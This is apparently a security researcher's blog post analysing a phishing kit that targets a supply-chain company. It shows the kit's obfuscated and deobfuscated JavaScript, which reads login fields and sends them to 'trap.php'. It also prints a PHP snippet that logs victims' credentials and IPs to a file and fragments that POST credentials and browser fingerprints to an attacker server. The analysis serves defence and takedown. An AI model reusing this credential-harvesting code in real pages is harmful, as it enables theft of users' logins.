---
layout: default
title: Obfuscated JavaScript in Phishing Kits
image: /images/stock/skull_green.jpg
categories: blog
tags: blog phishing scams passwords code-analysis
date: 2025-05-16
permalink: /blog/:year/:month/:day/:title/
description: While sorting phishing kits this morning, I discovered a clever use of JavaScript to hide an infostealer. 
---

While sorting phishing kits this morning, I came across an interesting bit of JavaScaript. The code was being used to mask the infostealer attached to the phishing kit's login form. 

The use of obfuscation isn't new, and the idea that a criminal would attempt to hide the code used to capture victim input is a given (considering the nature of the research I'm doing). Still, I was still intrigued by the level of effort made here, and  thought it worth exploring.

## The Code:
Everything revolves around the ```ajaxget()``` command which is attached to the phishing kit's login form. The phishing kit itself is targeting a global supply chain organization, which focuses on B2B development, and harvesting login credentials. Later, these compromised credentials can be curated or enriched with other data and sold.

<hr>

With Obfuscation:
```
[...]
function ajaxget()
{
    var _0x532663 = _0x5d39,
        _0x2b271f = new URLSearchParams();
    _0x2b271f[_0x532663(0x18a)]('name', document[_0x532663(0x18f) [...cut4length...]
    var _0x4f6ca7 = new XMLHttpRequest();
    return _0x4f6ca7[_0x532663(0x180)]  [...cut4length...]
    {
        var _0x54b84e = _0x532663;
        console[_0x54b84e(0x181)](this['response']);
    }, _0x4f6ca7[_0x532663(0x18c)](), ![];
}
[...]

```
<hr>

No Obfuscation:
```
function ajaxget() {
  let params = new URLSearchParams();
  params.append('name', document.getElementById('email').value);
  params.append('password', document.getElementById('password').value);

  let xhr = new XMLHttpRequest();
  xhr.open('GET', 'trap.php?' + params.toString());
  xhr.onload = function() {
    console.log(this.response);
  };
  xhr.send();
  return false;
}
```
<hr>

## Layered Complexity:
To give an idea as to what's happening, the JavaScript is building a ```?email=``` string using all of the flagged parameters, and passing them over to ```trap.php```. It is important to know that ```trap.php``` can be hosted locally or remotely. In this case, the criminal behind the attack I'm investigating chose to do both. 

There are three blocks within the obfuscated JavaScript code, which I won't reproduce here for obvious reasons. All three blocks are essentially formatted in similar fashion, where the obfuscation is designed to mask functionality from passive viewing. 

The attack follows a cycle, where a retry limit (```rc```) is set, and the user is promoted for a username/password combination until the retry limit is reached. Once that happens, they are directed to the real domain and the attack concludes. 


**Block 1:**   
Grabs the login information (email/password) and sends it over to ```trap.php```, which records the victim's IP address, login details, date, timestamp, and writes it to ```rich.txt```
  
```
$file=fopen("rich.txt", "a");
fwrite($file, "$Name\n$Pass\n$ip\n$date$time");
fwrite($file, "\n");
fwrite($file, "\n");
fclose($file);
```

**Block 2:**  
Performs a loop presenting a "wrong password" error, while taking the login form details and processing them via ```POST``` to a server controlled by the attacker. In this case, the ```POST``` was directed to ```ps.php``` on the remote server, which is just a renamed ```trap.php``` file.  
```  
[...]  
    $.ajax({
      dataType:   'JSON',
      url:        fUrl,
      type:       'POST',
      data:       data,
      beforeSend: () => $('#pr').html('Verifying...'),
      complete:   () => {  
[...]    
```

**Block 3:**  
Does a fingerprint of the victim's operating system, login details, browser data, and IP address (via api.ipify.org) and passes this data over to the remote server via ```POST```.

```    
[...]
$.post(url, {
    TXT_01: email,
    TXT_02: pass,
    TXT_03: ip,
    TXT_04: os,
    TXT_05: browser  
[...]  
```

## Hidden in Plain Sight:

Again, using obfuscation isn't a new technique. Criminals have been doing so for a long time, as it can help increase the lifespan of a given phishing attack, or keep things hidden from passive viewing or scanning.

The interesting thing for me is that whoever developed this phishing kit used three layers of array-based string obfuscation in order to slow / stop anyone from attempting to reverse-engineer the attack.

Unfortunately for the criminal, and fortunately for the rest of us, the attack staging exposed the phishing kit's source code (via .zip file). This led to the take down of the original phishing website, as well as the external domains used to host the information sent via ```POST```.

Overall, this was an interesting kit / technique to explore, but I think I'd rather let someone else do the code analysis. My head is swimming in JavaScript now. 